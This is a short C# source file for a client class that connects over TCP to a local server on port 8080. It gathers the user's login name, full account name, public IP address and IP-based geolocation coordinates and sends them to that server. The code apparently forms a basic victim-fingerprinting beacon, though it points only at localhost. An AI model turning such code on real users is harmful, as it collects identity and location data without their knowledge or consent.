using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Management;
using System.Text.Json;
using ANA_Client;
using static System.Net.Mime.MediaTypeNames;
public class Client
{
    private Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
    private IList<string> _sendingInfos = new List<string>();

    public async Task ConnectToClientAsync()
    {
        IPEndPoint localIpEndPoint = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 8080);
        try
        {
            socket.Connect(localIpEndPoint);

            _sendingInfos.Add($"User Name :  {Environment.UserName}");
            _sendingInfos.Add($"Full Name :  {GetIdentity()}");
            _sendingInfos.Add($"IP Address : {await GetPublicIPAddressAsync()}");
            _sendingInfos.Add($"Coord : {await GetPositionInfo()}");

            SendMessageToServer(string.Join("\n", _sendingInfos));
        }
        catch (SocketException socket_ex)
        {
            Console.WriteLine($"{socket_ex.Message}");
            Console.WriteLine($"{socket_ex.ErrorCode}");
        }
    }

    private void SendMessageToServer(string command)
    {
        try
        {
            byte[] commandBuffer = Encoding.ASCII.GetBytes(command);
            socket.Send(commandBuffer);

            byte[] responseBuffer = new byte[1024];
            int receivedBytes = socket.Receive(responseBuffer);
            string response = Encoding.ASCII.GetString(responseBuffer, 0, receivedBytes);

            Console.WriteLine($"{response}");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error during communication: {ex.Message}");
        }
    }
    private async Task<string> GetPublicIPAddressAsync()
    {
        using (HttpClient httpClient = new HttpClient())
        {
            try
            {
                HttpResponseMessage response = await httpClient.GetAsync("https://api.ipify.org");
                response.EnsureSuccessStatusCode();
                string publicIPAddress = await response.Content.ReadAsStringAsync();
                return publicIPAddress.Trim();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error fetching public IP address: {ex.Message}");
                return GetNull();
            }
        }
    }

    private string GetIdentity()
    {
        try
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_UserAccount");
            foreach (ManagementObject user in searcher.Get())
            {
                string fullName = user["FullName"]?.ToString();
                if (!string.IsNullOrEmpty(fullName))
                {
                    return fullName;
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Erreur : " + ex.Message);
        }

        return GetNull();
    }

    private async Task<string> GetPositionInfo()
    {
        try
        {
            string publicIpAddress = await GetPublicIPAddressAsync();
            string url = $"http://ip-api.com/json/{publicIpAddress}";
            Console.WriteLine(url);

            using (HttpClient client = new HttpClient())
            {
                HttpResponseMessage response = await client.GetAsync(url);

                if (response.IsSuccessStatusCode)
                {
                    string jsonString = await response.Content.ReadAsStringAsync();
                    LocalPosition position = JsonSerializer.Deserialize<LocalPosition>(jsonString);
                    return $"lat : {position.lat.ToString()}, lng : {position.lon.ToString()}";
                }
                else
                {
                    return $"Failed to fetch data. Status code: {response.StatusCode}";
                }
            }
        }
        catch (Exception ex)
        {
            return $"Exception occurred: {ex.Message}";
        }
    }

    private string GetNull()
    {
        return "...";
    }
}

